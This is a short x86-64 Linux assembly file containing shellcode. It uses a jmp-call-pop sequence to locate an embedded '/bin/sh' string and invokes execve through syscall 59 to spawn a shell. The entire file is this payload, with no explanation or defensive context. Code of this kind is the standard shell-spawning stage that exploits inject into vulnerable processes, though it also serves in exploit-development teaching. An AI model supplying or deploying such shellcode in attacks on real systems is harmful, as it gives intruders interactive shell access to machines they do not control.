section .text
	global _start
_start:
		jmp short print_string
		
		execute:
		pop rdi ; rdi -> /bin/sh
		xor rdx , rdx
		push rdx
		push rdi ; /bin/sh -> NULL
		mov rsi , rsp
		
		
		
		mov al , 59
		syscall
		
		
		print_string:
		call execute
		db '/bin/sh' , 0
